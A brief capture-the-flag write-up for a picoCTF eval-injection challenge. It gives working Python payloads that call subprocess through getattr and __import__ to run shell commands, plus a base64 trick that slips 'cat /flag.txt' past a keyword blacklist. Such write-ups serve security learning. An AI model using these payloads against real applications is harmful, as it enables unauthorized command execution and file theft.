### CHALLENGE DESCRIPTION
![](assets/img/pico/3v@l/1.png)

### SOLUTION 
I have tried lots of things like XSS, SSTI, SQLi, but nothing happend.

So I do research, and try dynamic functions in Python.
```bash
getattr(__import__('subprocess'), 'getoutput')('whoami')
```
So we can see that we have the result. But there is a blacked list
![](assets/img/pico/3v@l/2.png)

We need to encode it the payload first before post it by `base64`
```bash
echo "cat /flag.txt" | base64

getattr(__import__('subprocess'), 'getoutput')('file_path=$(echo "Y2F0IC9mbGFnLnR4dAo=" | base64 --decode); $file_path')
```
